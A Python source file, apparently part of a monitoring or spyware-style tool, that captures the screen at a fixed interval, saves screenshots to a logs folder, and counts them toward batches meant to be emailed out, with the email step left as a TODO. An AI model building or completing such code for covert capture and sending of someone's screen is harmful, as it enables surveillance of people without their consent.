from PIL.ImageGrab import grab
from os.path import join
import sys
from datetime import datetime
from time import sleep
from config import LOGS_DIRECTORY_PATH, SCREENSHOT_INTERVAL, SCREENSHOTS_PER_EMAIL
from utils.utils import get_timestamp, log, handle_counter


class ScreenLogger:
    def __init__(self):
        self.logs_directory_path = LOGS_DIRECTORY_PATH if LOGS_DIRECTORY_PATH else ""
        self.error_file_path = join(LOGS_DIRECTORY_PATH, "errors.txt") if LOGS_DIRECTORY_PATH else "errors.txt"
        self.counter = 0
        self.counter_max = SCREENSHOTS_PER_EMAIL
        self.interval = SCREENSHOT_INTERVAL
        self.running = True

    def log_screen(self):
        screenshot = grab()
        screenshot.save(join(self.logs_directory_path, f"screenshots/{get_timestamp()}.png"))
        screenshot.close()

    def handle_counter(self):
        self.counter += 1
        if handle_counter(self.counter, self.counter_max):
            pass  # TODO: EMail logic here

    def run(self):
        try:
            while self.running:
                self.log_screen()
                self.handle_counter()
                sleep(self.interval)
        except KeyboardInterrupt:
            self.running = False
        except Exception as e:
            self.log_error("AN ERROR OCCURRED WHILE LOGGING SCREEN:", e)

    def log_error(self, message: str, exception: Exception) -> None:
        log(message, self.error_file_path)
        log(str(exception), self.error_file_path)


def main():
    screen_logger = ScreenLogger()
    try:
        screen_logger.run()
    except Exception:
        print("An error occurred while logging screen:")
        print(f"See full error here: {screen_logger.error_file_path}")


if __name__ == "__main__":
    sys.exit(main())
